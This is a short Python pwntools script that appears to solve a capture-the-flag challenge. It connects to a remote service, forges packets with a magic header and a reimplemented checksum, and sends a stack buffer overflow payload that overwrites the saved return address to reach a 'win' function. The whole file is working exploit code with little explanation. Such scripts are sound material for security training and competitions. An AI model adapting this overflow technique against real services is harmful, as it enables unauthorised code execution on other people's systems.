#!/usr/bin/env python3
from pwn import *

HOST = "p2p.putcyberdays.pl"
PORT = 8080
WIN_ADDR = 0x401208


def checksum(data: bytes) -> int:
    c = 0x12345678
    for i, b in enumerate(data):
        if b >= 128:
            b -= 256
        c ^= ((b & 0xFFFFFFFF) << (i & 3)) & 0xFFFFFFFF
        c = ((c << 5) | (c >> 27)) & 0xFFFFFFFF
    return c


def build_packet(msg: bytes) -> bytes:
    return p32(0xCAFEBABE) + p32(len(msg)) + p32(checksum(msg)) + msg


def main():
    io = remote(HOST, PORT)

    io.recvuntil(b"Select > ")
    io.sendline(b"1")
    io.recvuntil(b"username: ")
    io.sendline(b"x")
    io.recvuntil(b"now...\n")

    # overflow buffer (80), saved rbp (8), then overwrite RIP to win function
    payload = b"A" * 80 + b"B" * 8 + p64(WIN_ADDR)
    io.send(build_packet(payload))

    out = io.recvrepeat(2)
    text = out.decode("latin1", errors="ignore")
    print(text)

    io.close()


if __name__ == "__main__":
    main()
